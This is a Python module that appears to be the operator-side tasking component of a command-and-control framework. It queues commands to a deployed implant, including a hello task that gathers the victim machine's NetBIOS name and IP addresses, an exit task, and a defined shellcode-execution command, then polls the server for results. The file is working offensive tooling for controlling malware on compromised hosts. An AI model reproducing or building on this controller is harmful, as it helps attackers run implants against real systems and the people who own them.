import time
import base64

from lib import logging

##
## Command to execute
##
COMMAND_HELLO             = 0
COMMAND_EXITFREE          = 1
COMMAND_EXECUTE_SHELLCODE = 2

##
## Executes Hello, and returns the result
##
def Task_Hello( WebObj, ClientObj, Block, Args ):
    try:
        ##
        ## Create an Hello task
        ##
        Tsk = WebObj.new_task( {
            'code': COMMAND_HELLO,
            'callback': 0,
            'target_id': ClientObj['id'],
            'args': { 'buffer': '{}'.format( base64.b64encode( b'' ).decode() ) }
        } );

        logging.success( 'Tasked to say hello {}'.format( ClientObj['implant_id'] ) );

        ##
        ## Log
        ##
        if Block:
            while True:
                ##
                ## Get the current task.
                ##
                Obj = WebObj.get_task( str( Tsk['id'] ) )[0];

                ##
                ## Did we succeed?
                ##
                if Obj['status'] == 3:
                    ##
                    ## Print about task.
                    ##
                    logging.success( 'Task was executed. Function returned {}'.format( Obj['return_code'] ) );

                    ##
                    ## Extract information
                    ##
                    if Obj['return_data']:
                        Str = base64.b64decode( Obj['return_data'] );
                        Dsk = Str[ 10 : ].decode().split( '\t' )[ 0 ];
                        Ips = Str[ 10 : ].decode().split( '\t' )[ 1 ];

                        ##
                        ## Printing the netbios information
                        ##
                        logging.print( 'NETBIOS: {}'.format( Dsk ) );

                        ##
                        ## Print the interface and IPv4
                        ## 
                        for Info in Ips.split( ';' ):
                            if Info:
                                logging.print( 'Interface: {} Ipv4: {}'.format( Info.split(':')[ 0 ], Info.split(':')[ 1 ] ) );
                    else:
                        logging.error( 'No return data was recieved' );

                    ##
                    ## Abort!
                    ## 
                    break;
                else:
                    ##
                    ## Wait for a period!
                    ## 
                    time.sleep( 5 );
        else:
            logging.warn( 'Tasking will not print output as blocking is not enabled.' );
    except Exception as e:
        logging.error( e );

##
## Executes ExitFree, and returns the result
##
def Task_ExitFree( WebObj, ClientObj, Block, Args ):
    try:
        ##
        ## Create an ExitFree task
        ##
        Tsk = WebObj.new_task( {
            'code': COMMAND_EXITFREE,
            'callback': 0,
            'target_id': ClientObj['id'],
            'args': { 'buffer': '{}'.format( base64.b64encode( b'' ).decode() ) }
        } );

        logging.success( 'Tasked to exit {}'.format( ClientObj['implant_id'] ) );

        ##
        ## Cannot block
        ##
        if Block:
            ##
            ## Warn the client
            ##
            logging.warn( 'Unable to block for the exit command.' );
    except Exception as e:
        logging.error( e );
